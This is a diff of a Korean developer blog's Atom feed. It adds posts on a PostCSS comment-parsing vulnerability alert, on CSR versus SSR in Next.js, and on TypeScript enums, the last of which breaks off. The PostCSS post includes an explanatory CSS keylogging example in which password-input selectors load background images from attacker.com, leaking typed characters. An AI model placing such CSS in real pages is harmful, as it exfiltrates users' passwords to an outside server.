@@ -1,62 +1,1099 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="ko-KR"><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="ko-KR" /><updated>2024-08-17T11:52:10+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">H0ri</title><subtitle>프론트엔드 개발 &amp; 일본어 공부를 위한 블로그입니다.
-</subtitle><author><name>Lee Ho</name><email>bomlang4211@gmail.com</email></author><entry><title type="html">왜 리액트를 사용해야 할까?</title><link href="http://localhost:4000/study/react/2023-10-08-whyUseReact/" rel="alternate" type="text/html" title="왜 리액트를 사용해야 할까?" /><published>2023-10-08T00:00:00+09:00</published><updated>2024-08-17T11:27:01+09:00</updated><id>http://localhost:4000/study/react/whyUseReact</id><content type="html" xml:base="http://localhost:4000/study/react/2023-10-08-whyUseReact/"><![CDATA[<hr />
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="ko-KR"><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="ko-KR" /><updated>2024-08-20T09:48:33+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">H0ri</title><subtitle>프론트엔드 개발 &amp; 일본어 공부를 위한 블로그입니다.
+</subtitle><author><name>Lee Ho</name><email>bomlang4211@gmail.com</email></author><entry><title type="html">PostCSS line return parsing error??</title><link href="http://localhost:4000/project/2024-08-15-postCSSerror/" rel="alternate" type="text/html" title="PostCSS line return parsing error??" /><published>2024-08-15T00:00:00+09:00</published><updated>2024-08-19T16:34:04+09:00</updated><id>http://localhost:4000/project/postCSSerror</id><content type="html" xml:base="http://localhost:4000/project/2024-08-15-postCSSerror/"><![CDATA[<h2 id="개요">개요</h2>
 
-<ul>
-  <li>toc</li>
-</ul>
+<p><img src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/vckf9zny0t6t8m11ukl1.png" alt="Security Alert" /></p>
 
-<h1 id="why-use-react">Why use React?</h1>
+<ol>
+  <li>프로젝트 초기 환경설정을 마치고 GitHub에 push를 하니, 위와 같은 보안 문제 알림이 나타났습니다.</li>
+</ol>
 
-<p>프론트엔드 개발자를 희망하는 나를 포함한 여러 학생들이 학원을 통해서나 개인의 학습을 통해 공부를 한다했을때, 공통점을 하나 꼽을 수 있다.
-바로 리액트! 현재 프론트엔드에서 리액트는 기본으로 탑재된 교양과도 마찬가지의 수준이다. 물론 리액트를 제외한 수많은 라이브러리, 또는 프레임워크가 있으나 리액트는 그 중심점에 있다고 생각한다.
-그럼 왜 리액트일까? 대체 리액트가 무엇이길래?</p>
+<p><img src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/i0ooacksf5b9y1qkdpdo.png" alt="Security Alert Details" /></p>
 
-<h1 id="리액트는-프레임워크일까-라이브러리일까">리액트는 프레임워크일까, 라이브러리일까?</h1>
+<ol>
+  <li>알림 내용을 확인해보니 위와 같은 에러가 발생했습니다.</li>
+</ol>
 
-<p>‘사용자 인터페이스를 만들기 위한 JavaScript 라이브러리’ 라고 리액트팀에선 정의하고있다.</p>
+<p><img src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/afl4segss7c5l7qd5ca8.png" alt="Error Translation" /></p>
 
-<!-- <img src="./../../assets/img/programming/reactHome.png" alt="리액트 홈페이지의 일부를 스크랩한 사진"> -->
+<ol>
+  <li>
+    <p>내용을 번역해보면:</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    8.4.31 이전의 PostCSS에서 문제가 발견되었습니다. PostCSS를 사용하여 외부 Cascading Style Sheets(CSS)를 구문 분석하는 linter에 영향을 미칩니다. 규칙에서
+
+이 보일 때 불일치가 있을 수 있습니다. 예를 들어, `@font-face{ font:(
+</code></pre></div>    </div>
+
+    <p>/*);}` 와 같은 코드가 그렇습니다.</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    이 취약점은 PostCSS를 사용하여 신뢰할 수 없는 외부 CSS를 구문 분석하는 린터에 영향을 미칩니다. 공격자는 PostCSS에서 구문 분석한 부분을 CSS 주석으로 포함하는 방식으로 CSS를 준비할 수 있습니다. PostCSS에서 처리한 후 원래 주석에 포함되었음에도 불구하고 CSS 노드(규칙, 속성)의 PostCSS 출력에 포함됩니다.
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<p><img src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/9nid3pulscyfna659ldl.png" alt="PostCSS Version" /></p>
+
+<ol>
+  <li>현재 프로젝트에서는 8.0.0 버전을 사용 중이라 GitHub에서 보안 문제를 경고했다는 것을 알 수 있습니다.</li>
+</ol>
+
+<hr />
+
+<h2 id="어떤-문제였을까">어떤 문제였을까?</h2>
+
+<ol>
+  <li>
+    <p><strong>PostCSS가 뭘까?</strong>
+먼저 PostCSS가 뭔지 알아야 할 필요가 있습니다.</p>
+
+    <p><em>PostCSS: CSS 파일을 처리하고 변환하는데 사용되는 도구입니다. 이를 통해 CSS의 구문을 파싱하여 다양한 작업(예: 자동 접두사 추가, 변수 처리 등)을 수행할 수 있습니다.</em></p>
+  </li>
+  <li>
+    <p><strong>그러면 PostCSS의 어떤 부분이 문제였을까요?</strong>
+<strong>이 취약점의 핵심은 PostCSS가 특정 방식으로 주석을 처리할 때 발생하는 문제입니다.</strong></p>
+
+    <p>CSS에서 주석을 처리할 때에는 <code class="language-plaintext highlighter-rouge">/* comment */</code> 형식으로 작성됩니다. 이를 이용하여 공격자는 특정 상황에서 주석 내부에 CSS 구문을 포함시킨 다음, 이 CSS가 PostCSS로 처리될 때 주석이 아닌 일반 규칙으로 인식되도록 할 수 있습니다.</p>
+
+    <div class="language-css highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">@font-face</span> <span class="p">{</span>
+<span class="nl">font</span><span class="p">:</span> <span class="p">(</span><span class="err">\</span><span class="n">r</span><span class="p">/</span><span class="err">*</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>위의 `
+`은 캐리지 리턴(줄바꿈 문자)입니다. 이 구문은 실제로는 CSS 주석 내부에 있어야 하는 내용입니다.</p>
+  </li>
+  <li>
+    <p>그러나 PostCSS는 이 부분을 주석으로 올바르게 인식하지 못하고, 주석이 아닌 정상적인 CSS 코드로 처리하는 부분이 문제가 되었습니다.</p>
+  </li>
+</ol>
+
+<hr />
+
+<h2 id="얼마나-위험한가">얼마나 위험한가?</h2>
+
+<ol>
+  <li>
+    <p><strong>CSS Injection (CSS 인젝션)</strong>
+CSS 인젝션은 일반적으로 웹 애플리케이션이 사용자로부터 입력받은 값을 제대로 검증하지 않고, 이를 CSS 코드에 삽입할 때 발생합니다. 공격자는 이를 통해 페이지의 스타일을 조작하거나, 더 심각한 경우 악성 스크립트를 실행할 수 있습니다.</p>
+
+    <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;style&gt;</span>
+  <span class="nt">body</span> <span class="p">{</span>
+    <span class="nl">background-color</span><span class="p">:</span> <span class="c">/*user input*/</span> <span class="p">;</span>
+  <span class="p">}</span>
+<span class="nt">&lt;/style&gt;</span>
+</code></pre></div>    </div>
+
+    <p>만약 <code class="language-plaintext highlighter-rouge">/*user input*/</code>에 악성 CSS 코드가 삽입된다면, 페이지의 스타일이 비정상적으로 변경되거나 예상치 못한 동작이 발생할 수 있습니다.</p>
+  </li>
+  <li>
+    <p><strong>CSS Keylogging (CSS 키로깅)</strong>
+CSS를 사용해 키 입력을 추적하는 방법입니다. 공격자는 CSS의 <code class="language-plaintext highlighter-rouge">:focus</code> 및 <code class="language-plaintext highlighter-rouge">::before</code>, <code class="language-plaintext highlighter-rouge">::after</code> 같은 가상 선택자를 사용하여 특정 입력 필드가 선택될 때마다 고유한 스타일을 적용할 수 있습니다. 이를 통해 키 입력을 간접적으로 추적할 수 있습니다.</p>
+
+    <div class="language-css highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">input</span><span class="o">[</span><span class="nt">type</span><span class="o">=</span><span class="s1">"password"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"a"</span><span class="o">]</span> <span class="p">{</span>
+  <span class="nl">background-image</span><span class="p">:</span> <span class="sx">url("http://attacker.com/log/a")</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="nt">input</span><span class="o">[</span><span class="nt">type</span><span class="o">=</span><span class="s1">"password"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"b"</span><span class="o">]</span> <span class="p">{</span>
+  <span class="nl">background-image</span><span class="p">:</span> <span class="sx">url("http://attacker.com/log/b")</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>    </div>
+
+    <p>사용자가 특정 값을 입력하면, 해당 값에 대한 HTTP 요청이 공격자 서버로 전송될 수 있습니다. 이 방식으로 비밀번호 등의 민감한 정보를 추적할 수 있습니다.</p>
+  </li>
+</ol>]]></content><author><name>Lee Ho</name><email>bomlang4211@gmail.com</email></author><category term="project" /><summary type="html"><![CDATA['PostCSS line return parsing error'에 대해서 어떤 에러인지 알아보고, 해당 에러의 위험성의 대해서도 함께 알아봅니다.]]></summary></entry><entry><title type="html">Next.js를 사용하기 위해 알아야 할 점 (CSR &amp;amp; SSR)</title><link href="http://localhost:4000/study/cs/2024-03-12-CSR&SSR/" rel="alternate" type="text/html" title="Next.js를 사용하기 위해 알아야 할 점 (CSR &amp;amp; SSR)" /><published>2024-03-12T00:00:00+09:00</published><updated>2024-08-20T09:31:26+09:00</updated><id>http://localhost:4000/study/cs/CSR&amp;SSR</id><content type="html" xml:base="http://localhost:4000/study/cs/2024-03-12-CSR&amp;SSR/"><![CDATA[<p>프론트엔드 개발자가 되고자 한다면, 현재 Next.js가 각광받고 있다는 것을 알 수 있습니다.</p>
+
+<p>프로젝트 인원 모집 페이지를 보면, 프론트엔드에서 Next.js를 사용하지 못하면 참여할 수 있는 프로젝트가 많지 않다는 것을 알게 됩니다.</p>
+
+<p>앞으로 취업 후에도 회사에서 Next.js를 사용할 가능성이 크기 때문에, 미리 공부해 두는 것이 좋습니다.</p>
+
+<p>그래서 최근에 인터넷 강의를 시청하며 Next.js에 대해 공부하고 있습니다.</p>
+
 <p><br /></p>
 
-<p>넷에서 많은 유저들이 리액트는 프레임워크인가, 라이브러리인가에 대한 주제에 대해 수 많은 의견과 논쟁이 오간적이 있다. 먼저 ‘원하는 기능을 구현하려 할 때 필요한 모든 기능을 제공해주는 것’을 우리는 프레임워크라고 부른다. 반면 라이브러리는 ‘개발자가 필요한 기능들을 그때 그때 호출하여 기능을 구현’한다.
-그러면 누군가는 이렇게 말할 수도 있다. “리액트에서는 많은 훅 기능들과 api를 제공한다. 그럼 이건 프레임워크가 아닌가?!” 라고 말이다.
-하지만 리액트는 컴포넌트 시스템을 제공하지만 라우팅, 데이터 패치 등과 같은 방법을 제공하지 않을 뿐더러 특정 방법 사용을 규정하지도 않는다.또한 사용자가 필요한 방법을 입맛에 맞게 추가해 구성할 수 있고, 무엇보다 리액트팀에서 ‘리액트는 라이브러리다’ 라고 못박아 놓기도 하였다.</p>
+<p>Next.js에 대한 강의를 시청하면서, 기존 리액트 예를 들어 CRA(Create React App)를 사용한 웹페이지와 Next.js를 사용한 웹페이지를 비교하는 영상이 있었습니다.</p>
 
-<h1 id="리액트는-무엇인가">리액트는 무엇인가?</h1>
+<p>이는 CSR과 SSR의 차이점을 보여주는 강의였습니다.</p>
 
-<p>리액트는 Facebook(Meta)에서 개발한 자바스크립트 UI 라이브러리이다. 특히 리액트는 싱글 페이지(SPA) 애플리케이션의 UI를 생성하는데 집중되어있다. 리액트의 특징 중 몇가지를 같이 정리하자면, JSX(JavaScript XML)이라는 간단한 문법을 통하여 단방향 데이터 바인딩을 사용하는 것이 특징이다. 또한 가상 돔(Virtual DOM)이라는 개념을 사용하여 이전 돔과 바뀐 돔을 비교하는 작업을 통해, 웹 애플리케이션의 퍼포먼스를 최적화한다.
-단점으로는 싱글 페이지(SPA)에 특화되어있는만큼 리액트는 페이지전환기능을 제공해주지 않는다. 만약 리액트에서 페이지 전환이 필요하다면, ‘React-Router’라는 라이브러리를 사용하여야 한다.</p>
+<p>평소에도 CSR과 SSR의 차이에 대해 물으면 형식적으로 답할 수 있을 정도의 수준이었지만, 실제로 Next.js를 사용해 보고 차이점을 눈으로 확인하면서 그 차이를 명확하게 느낄 수 있었습니다.</p>
 
-<h1 id="리액트의-컴포넌트와-그-구성요소는-무엇인가">리액트의 컴포넌트와, 그 구성요소는 무엇인가?</h1>
+<p>이제 React에서 CSR을 사용했다면, Next.js로 넘어가기 위해서는 SSR에 대해 이해하고 넘어가는 것이 필요합니다.</p>
 
-<p>컴포넌트는 React의 핵심 개념 중 하나이다. 컴포넌트는 사용자 인터페이스를 구축하는 기본이 되며, React를 시작하는데 필히 알아야 할 개념이기도 하다.
-컴포넌트에 대하여 정의하자면, ‘React 컴포넌트는 마크업을 생성하는 JavaScript 함수’라고 할 수 있다. 좀 더 추가적으로 리액트에서 컴포넌트를 사용할 때에는 대문자로 표기해야 리액트에서 컴포넌트로 인식한다는 점이다.
-(구성요소는 무엇인가? 라는 질문에 대한 정답을 아직 찾지못하였다.)</p>
+<p><br /></p>
 
-<h1 id="props-state-렌더링-jsx에-대한-설명">props, state, 렌더링, JSX에 대한 설명.</h1>
+<h2 id="csr과-ssr">CSR과 SSR?</h2>
 
-<p>리액트에서 컴포넌트를 하나 생성했다면, 해당 컴포넌트에서는 매개변수를 받을 수 있다. 그리고 그 매개변수를 우리는 ‘프롭스(props)’라고 부른다.
-보통 함수에서 매개변수에는 string이나 boolean, 함수등의 여러가지를 받을 수 있지만 리액트에서 props는 객체로 정의되어있기에, props라는 객체안에 전달하려는 값이 string이던 함수등이 전달된다.</p>
+<h3 id="csr을-먼저-알아봅시다">CSR을 먼저 알아봅시다</h3>
 
-<p>state는 리액트를 사용하여 제작하는 페이지에서 값이 바뀌어야 한다면 아주 중요하고 필요한 존재이다. 리액트에서 제공하는 useState훅을 이용하여 우리는 state를 관리할 수 있다. state를 사용하여 어떠한 상태값을 저장하기만 할 수도 있고, 필요하다면 그 상태값을 업데이트하면서 제작하는 페이지가 좀 더 다이나믹하게 변하는 것을 경험할 수 있다.</p>
+<p>리액트를 배우기 시작하면 처음에는 HTML, CSS, JS를 배운 후, 이 세 가지를 합쳐 웹페이지를 만드는 데 익숙해집니다.</p>
 
-<p>리액트에서 렌더링이란것은 앞서 개발자가 선언한(제작한) 컴포넌트가 props와 state를 통해 UI를 구성하는 작업을 컴포넌트에게 요청하는 작업을 말한다.
-리액트 공식홈페이지를 살펴보면 리액트가 코드를 바로 화면에 출력하는 것이 아니라, ‘Trigger - Rendering - Commit’이란 총 3가지의 과정을 거치게된다. 그리고 위에서 설명한 state는 이 과정중 Trigger와 매우 연광성이 깊다.
-렌더링에 대해서 이야기하자면 리액트의 생태계부터 뜯어가며 알아보아야 하기때문에 여기까지만 적고 JSX로 넘어가도록 하겠다.</p>
+<p>하지만 리액트에서는 <code class="language-plaintext highlighter-rouge">&lt;div id="root"&gt;&lt;/div&gt;</code>만 있는 HTML 페이지가 기본으로 제공됩니다.</p>
 
-<p>JSX(JavaScript XML)은 HTML이랑 착각하는 사람도 있는데, 정확히는 예전에 XML문법을 추가한 문법이다. 이는 리액트자체에서 제공하는 공식적인 문법은 아니다.</p>
+<p>여기서부터 CSR과 SSR의 차이를 이해할 수 있습니다.</p>
 
-<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nf">App</span><span class="p">()</span> <span class="p">{</span>
-  <span class="k">return</span> <span class="nx">React</span><span class="p">.</span><span class="nf">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">h1</span><span class="dl">"</span><span class="p">,</span> <span class="kc">null</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Hello, React!</span><span class="dl">"</span><span class="p">);</span>
+<p><br /></p>
+
+<p>생각해봅시다.</p>
+
+<ol>
+  <li>만약 우리가 CRA 또는 Vite를 사용하여 리액트 웹페이지를 만들었다고 가정합니다.</li>
+  <li>사용자가 우리의 웹페이지에 방문하였습니다.</li>
+</ol>
+
+<p>이 과정에서 사용자는 리액트 웹페이지에 접근하면서 <code class="language-plaintext highlighter-rouge">&lt;div id="root"&gt;&lt;/div&gt;</code>만 포함된 HTML을 받게 됩니다. 서버는 HTML과 함께 자바스크립트 파일도 전달합니다.</p>
+
+<p>자바스크립트 파일을 받은 후에야 우리가 리액트로 코딩한 JSX 구문이 <code class="language-plaintext highlighter-rouge">&lt;div id="root"&gt;&lt;/div&gt;</code> 안에 렌더링되며, 페이지가 완성됩니다.</p>
+
+<p><br /></p>
+
+<p>좀 더 이해하기 쉽게 해보겠습니다.</p>
+
+<ol>
+  <li>만약 우리가 CRA 또는 Vite를 사용하여 리액트 웹페이지를 만들었다고 가정합니다.</li>
+  <li>자바스크립트를 사용하지 않는 사용자가 우리의 웹페이지에 방문하였습니다.</li>
+</ol>
+
+<p>이런 경우 사용자는 HTML만 받게 되며, 자바스크립트를 비활성화한 상태에서는 리액트 앱이 작동하지 않기 때문에 빈 화면을 보게 될 것입니다.</p>
+
+<p>CSR, Client Side Rendering은 클라이언트 측에서 모든 렌더링을 처리하는 방식입니다.</p>
+
+<p><br /></p>
+
+<h2 id="ssr을-알아봅시다">SSR을 알아봅시다</h2>
+
+<p>같은 조건을 Next.js로 바꾸어 생각해보겠습니다.</p>
+
+<ol>
+  <li>우리가 Next.js를 사용하여 리액트 웹페이지를 만들었다고 가정합니다.</li>
+  <li>자바스크립트를 사용하지 않는 사용자가 우리의 웹페이지에 방문하였습니다.</li>
+</ol>
+
+<p>이 경우, 사용자는 CSR과 달리 HTML 콘텐츠를 바로 볼 수 있습니다.</p>
+
+<p>Next.js는 SSR, Server Side Rendering을 사용하여 서버에서 HTML을 생성하고 클라이언트에 전달하기 때문입니다.</p>
+
+<p>SSR은 서버에서 렌더링된 HTML을 클라이언트에게 전달하며, 자바스크립트를 비활성화한 상태에서도 기본적인 콘텐츠를 확인할 수 있습니다.</p>
+
+<p>이 때문에 사용자는 페이지 로딩이 완료되기 전에도 콘텐츠를 볼 수 있어 사용자 경험이 향상됩니다.</p>
+
+<p><br /></p>
+
+<h2 id="nextjs의-csr과-ssr-혼합-사용">Next.js의 CSR과 SSR 혼합 사용</h2>
+
+<p>Next.js의 강력한 점은 CSR과 SSR을 혼합하여 사용할 수 있다는 점입니다. 예를 들어, 일부 페이지는 SSR로 처리하고, 일부는 CSR로 처리할 수 있습니다. 또한, 정적 페이지 생성(SSG)과 ISR(Incremental Static Regeneration) 같은 기능도 제공되어, 각 페이지에 최적화된 렌더링 방법을 선택할 수 있습니다.</p>
+
+<p><br /></p>
+
+<h2 id="자바스크립트를-사용하지-않는-사용자가-어디-있는가-그냥-csr을-써도-되는-거-아니야">자바스크립트를 사용하지 않는 사용자가 어디 있는가!? 그냥 CSR을 써도 되는 거 아니야?</h2>
+
+<p>물론 CSR도 훌륭한 선택입니다. 그러나 현재 트렌드는 SSR로 넘어가는 추세입니다.</p>
+
+<p>SSR은 SEO(검색 엔진 최적화)에도 유리하며, 사용자가 페이지를 더 빨리 볼 수 있어 사용자 경험이 향상됩니다.</p>
+
+<p>특히 인터넷 환경이 좋지 않은 지역에서 CSR은 자바스크립트 파일을 모두 다운로드할 때까지 빈 화면을 보여줄 수 있으므로, SSR이 더 나은 선택이 될 수 있습니다.</p>
+
+<p><br /></p>
+
+<h2 id="seo와-ssr">SEO와 SSR</h2>
+
+<p>SSR은 SEO에 매우 유리합니다. 검색 엔진 크롤러는 SSR로 제공된 페이지의 전체 HTML을 쉽게 읽을 수 있어, 콘텐츠 인덱싱이 더욱 효과적으로 이루어집니다.</p>
+
+<p>반면, CSR은 크롤러가 자바스크립트를 실행해야 페이지의 내용을 확인할 수 있기 때문에 SEO 측면에서 불리할 수 있습니다.</p>
+
+<p><br /></p>
+
+<h2 id="결론">결론</h2>
+
+<p>Next.js를 통해 SSR의 이점을 이해하고 활용하는 것이 중요합니다. CSR은 간단하고 빠르게 개발할 수 있지만, SSR은 더 나은 사용자 경험과 SEO 성능을 제공합니다. Next.js는 CSR, SSR, SSG, ISR 등 다양한 렌더링 옵션을 제공하므로, 각 프로젝트의 요구에 맞는 최적의 방식을 선택할 수 있습니다.</p>
+
+<p>이 글은 Next.js를 공부하면서 CSR과 SSR에 대해 공부한 점을 기록한 것입니다. 앞으로 더 많은 프로젝트에서 Next.js를 활용하며 이 점들을 실무에 적용해 보길 바랍니다.</p>]]></content><author><name>Lee Ho</name><email>bomlang4211@gmail.com</email></author><category term="study" /><category term="CS" /><summary type="html"><![CDATA[CSR과 SSR에 대해서 공부하고 기록합니다.]]></summary></entry><entry><title type="html">타입스크립트 강의를 듣다가 enum에 대해서 까먹어버렸다</title><link href="http://localhost:4000/study/etc/2024-02-08-enum/" rel="alternate" type="text/html" title="타입스크립트 강의를 듣다가 enum에 대해서 까먹어버렸다" /><published>2024-02-08T00:00:00+09:00</published><updated>2024-08-20T09:08:21+09:00</updated><id>http://localhost:4000/study/etc/enum</id><content type="html" xml:base="http://localhost:4000/study/etc/2024-02-08-enum/"><![CDATA[<h2 id="enum이-뭔가">enum이 뭔가?</h2>
+
+<p>타입스크립트에서 enum은 여러 개의 값을 하나의 이름으로 그룹화할 수 있는 강력한 기능입니다.</p>
+
+<p>이를 통해 코드의 가독성을 높이고, 특정 값만 사용할 수 있도록 제한할 수 있습니다.</p>
+
+<p><br /></p>
+
+<p>쉽게 말해, enum은 이름이 붙은 상수들의 집합입니다. 이 집합에 있는 각 값은 숫자 또는 문자열로 표현될 수 있습니다.</p>
+
+<div class="language-ts highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">enum</span> <span class="nx">Color</span> <span class="p">{</span>
+  <span class="nx">Red</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">RED</span><span class="dl">"</span><span class="p">,</span>
+  <span class="nx">Green</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">GREEN</span><span class="dl">"</span><span class="p">,</span>
+  <span class="nx">Blue</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">BLUE</span><span class="dl">"</span><span class="p">,</span>
+<span class="p">}</span>
+
+<span class="kd">let</span> <span class="nx">myColor</span><span class="p">:</span> <span class="nx">Color</span> <span class="o">=</span> <span class="nx">Color</span><span class="p">.</span><span class="nx">Green</span><span class="p">;</span>
+<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">myColor</span><span class="p">);</span> <span class="c1">// 출력: 'GREEN'</span>
+</code></pre></div></div>
+
+<p>위 코드에서 Color라는 enum을 선언했습니다.</p>
+
+<p>이제 myColor 변수가 Color 타입을 가지며, 이 변수에는 Color.Red, Color.Green, Color.Blue 중 하나의 값만 할당될 수 있습니다.</p>
+
+<p>이는 타입스크립트가 이 변수에 대해 엄격한 타입 검사를 하도록 도와줍니다.</p>
+
+<p><br /></p>
+
+<h2 id="enum의-동작-방식">enum의 동작 방식</h2>
+
+<p>타입스크립트의 enum은 두 가지 방식으로 동작합니다: 숫자 enum과 문자열 enum입니다.</p>
+
+<ol>
+  <li>숫자 enum
+숫자 enum은 기본적으로 0부터 시작하여 값이 자동으로 증가합니다. 아래의 예제를 통해 살펴보겠습니다.</li>
+</ol>
+
+<div class="language-ts highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">enum</span> <span class="nx">Direction</span> <span class="p">{</span>
+  <span class="nx">North</span><span class="p">,</span>
+  <span class="nx">South</span><span class="p">,</span>
+  <span class="nx">East</span><span class="p">,</span>
+  <span class="nx">West</span><span class="p">,</span>
+<span class="p">}</span>
+
+<span class="kd">let</span> <span class="nx">myDirection</span><span class="p">:</span> <span class="nx">Direction</span> <span class="o">=</span> <span class="nx">Direction</span><span class="p">.</span><span class="nx">North</span><span class="p">;</span>
+<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">myDirection</span><span class="p">);</span> <span class="c1">// 출력: 0</span>
+
+<span class="nx">myDirection</span> <span class="o">=</span> <span class="nx">Direction</span><span class="p">.</span><span class="nx">East</span><span class="p">;</span>
+<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">myDirection</span><span class="p">);</span> <span class="c1">// 출력: 2</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">Direction.North</code>는 0, <code class="language-plaintext highlighter-rouge">Direction.South</code>는 1, <code class="language-plaintext highlighter-rouge">Direction.East</code>는 2, <code class="language-plaintext highlighter-rouge">Direction.West</code>는 3으로 자동으로 할당됩니다.</p>
+
+<p><code class="language-plaintext highlighter-rouge">Direction.North</code>를 출력하면 0이 나오는 이유가 여기에 있습니다.</p>
+
+<p><br /></p>
+
+<ol>
+  <li>문자열 enum
+문자열 enum은 각 값에 고유한 문자열을 할당하는 방식입니다.</li>
+</ol>
+
+<div class="language-ts highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">enum</span> <span class="nx">Status</span> <span class="p">{</span>
+  <span class="nx">Active</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">ACTIVE</span><span class="dl">"</span><span class="p">,</span>
+  <span class="nx">Inactive</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">INACTIVE</span><span class="dl">"</span><span class="p">,</span>
+  <span class="nx">Pending</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">PENDING</span><span class="dl">"</span><span class="p">,</span>
+<span class="p">}</span>
+
+<span class="kd">let</span> <span class="nx">currentStatus</span><span class="p">:</span> <span class="nx">Status</span> <span class="o">=</span> <span class="nx">Status</span><span class="p">.</span><span class="nx">Active</span><span class="p">;</span>
+<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">currentStatus</span><span class="p">);</span> <span class="c1">// 출력: 'ACTIVE'</span>
+</code></pre></div></div>
+
+<p>문자열 enum은 각 값이 독립적인 문자열로 관리되므로, 숫자 enum과 달리 자동 증가하지 않습니다. <strong>대신, 모든 값을 명시적으로 지정해야 합니다.</strong></p>
+
+<p><br /></p>
+
+<h2 id="enum의-장점">enum의 장점</h2>
+
+<p>이제 enum을 사용하는 이유를 생각해보겠습니다.</p>
+
+<ol>
+  <li>
+    <p>타입 안정성: enum을 사용하면 유효하지 않은 값을 사용할 가능성을 줄일 수 있습니다. 예를 들어, 함수에 잘못된 값을 전달하는 실수를 방지할 수 있습니다.</p>
+  </li>
+  <li>
+    <p>가독성: 코드의 가독성을 높이는 데 도움이 됩니다. 각 상수에 의미 있는 이름을 부여할 수 있어, 코드를 읽는 사람에게 더 명확한 의미를 전달할 수 있습니다.</p>
+  </li>
+  <li>
+    <p>자동 완성 지원: enum을 사용하면 개발 도구(VS Code 등)에서 자동 완성 기능을 제공하여, 실수를 줄이고 개발 속도를 높일 수 있습니다.</p>
+  </li>
+</ol>
+
+<p><br /></p>
+
+<h2 id="enum의-단점">enum의 단점</h2>
+
+<p>하지만, enum에도 몇 가지 단점이 있습니다.</p>
+
+<ul>
+  <li>
+    <p>코드 복잡성: 너무 많은 enum을 사용하면 코드가 복잡해질 수 있습니다. 특히, 작은 프로젝트에서는 오히려 코드 가독성을 해칠 수 있습니다.</p>
+  </li>
+  <li>
+    <p>유니언 타입과 비교: 타입스크립트의 유니언 타입은 enum과 유사한 기능을 제공하지만, 더 가볍고 단순합니다.
+간단한 경우에는 enum 대신 유니언 타입을 사용하는 것이 더 나을 수 있습니다.</p>
+    <div class="language-ts highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">type</span> <span class="nx">Direction</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">North</span><span class="dl">"</span> <span class="o">|</span> <span class="dl">"</span><span class="s2">South</span><span class="dl">"</span> <span class="o">|</span> <span class="dl">"</span><span class="s2">East</span><span class="dl">"</span> <span class="o">|</span> <span class="dl">"</span><span class="s2">West</span><span class="dl">"</span><span class="p">;</span>
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p><br /></p>
+
+<h3 id="추가적으로-알아두면-좋은-enum-기능">추가적으로 알아두면 좋은 enum 기능</h3>
+
+<ol>
+  <li>const enum</li>
+</ol>
+
+<p>const enum은 성능 최적화를 위해 사용됩니다. 컴파일 시점에 실제 값으로 대체되어, 런타임에 불필요한 코드가 생성되지 않습니다.</p>
+
+<div class="language-ts highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="kr">enum</span> <span class="nx">Direction</span> <span class="p">{</span>
+  <span class="nx">North</span><span class="p">,</span>
+  <span class="nx">South</span><span class="p">,</span>
+  <span class="nx">East</span><span class="p">,</span>
+  <span class="nx">West</span><span class="p">,</span>
+<span class="p">}</span>
+
+<span class="kd">let</span> <span class="nx">myDirection</span><span class="p">:</span> <span class="nx">Direction</span> <span class="o">=</span> <span class="nx">Direction</span><span class="p">.</span><span class="nx">North</span><span class="p">;</span>
+<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">myDirection</span><span class="p">);</span> <span class="c1">// 출력: 0</span>
+</code></pre></div></div>
+
+<p><br /></p>
+
+<ol>
+  <li>리버스 매핑 (Reverse Mapping)</li>
+</ol>
+
